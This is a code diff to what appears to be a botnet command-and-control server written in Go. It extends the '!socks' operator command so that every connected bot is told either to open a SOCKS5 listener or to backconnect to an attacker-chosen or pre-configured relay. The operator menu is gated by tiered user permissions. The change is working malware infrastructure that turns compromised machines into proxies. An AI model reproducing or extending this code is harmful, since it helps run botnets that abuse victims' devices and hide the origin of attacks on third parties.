@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"strconv"
 	"strings"
 	"time"
 )
@@ -260,9 +261,11 @@ func (c *client) writeBotManagement(conn net.Conn) {
 func (c *client) writeSocksCommands(conn net.Conn) {
 	commands := []string{
 		"║  \033[1;35mSOCKS5 Proxy\033[1;97m                                ║",
-		"║    !socks <port>      - Start SOCKS5 proxy on port          ║",
-		"║    !stopsocks         - Stop SOCKS5 proxy                   ║",
-		"║    !socksauth <u> <p> - Set proxy username & password       ║",
+		"║    !socks <port>        - Direct listener on port           ║",
+		"║    !socks <relay:port>  - Backconnect to relay              ║",
+		"║    !socks               - Use pre-configured relays         ║",
+		"║    !stopsocks           - Stop SOCKS5 proxy                 ║",
+		"║    !socksauth <u> <p>   - Set proxy auth credentials        ║",
 	}
 	c.writeSection(conn, commands)
 }
@@ -622,14 +625,20 @@ func handleRequest(conn net.Conn) {
 						conn.Write([]byte("\033[1;31m❌ Permission denied: SOCKS commands require at least Pro level\r\n\033[0m"))
 						continue
 					}
-					if len(parts) < 2 {
-						conn.Write([]byte("Usage: !socks <port>\r\n"))
-						conn.Write([]byte("Example: !socks 1080\r\n"))
-						continue
+					if len(parts) >= 2 {
+						arg := parts[1]
+						sendToBots(fmt.Sprintf("!socks %s", arg))
+						// Detect if it's a port (direct) or relay address (backconnect)
+						if _, err := strconv.Atoi(arg); err == nil {
+							conn.Write([]byte(fmt.Sprintf("\033[1;35mSOCKS5 direct listener on port %s sent to all bots\r\n\033[0m", arg)))
+						} else {
+							conn.Write([]byte(fmt.Sprintf("\033[1;35mSOCKS5 backconnect to %s sent to all bots\r\n\033[0m", arg)))
+						}
+					} else {
+						// No args — bots use pre-configured relay endpoints
+						sendToBots("!socks")
+						conn.Write([]byte("\033[1;35mSOCKS5 backconnect (pre-configured relay) sent to all bots\r\n\033[0m"))
 					}
-					port := parts[1]
-					sendToBots(fmt.Sprintf("!socks %s", port))
-					conn.Write([]byte(fmt.Sprintf("\033[1;35mSOCKS5 proxy started on port %s for all bots\r\n\033[0m", port)))
 
 				case "!stopsocks":
 					if !c.canUseShell() {
@@ -637,7 +646,7 @@ func handleRequest(conn net.Conn) {
 						continue
 					}
 					sendToBots("!stopsocks")
-					conn.Write([]byte("\033[1;35mSOCKS5 proxy stop command sent to all bots\r\n\033[0m"))
+					conn.Write([]byte("\033[1;35mSOCKS5 backconnect stop sent to all bots\r\n\033[0m"))
 
 				case "!socksauth":
 					if !c.canUseShell() {
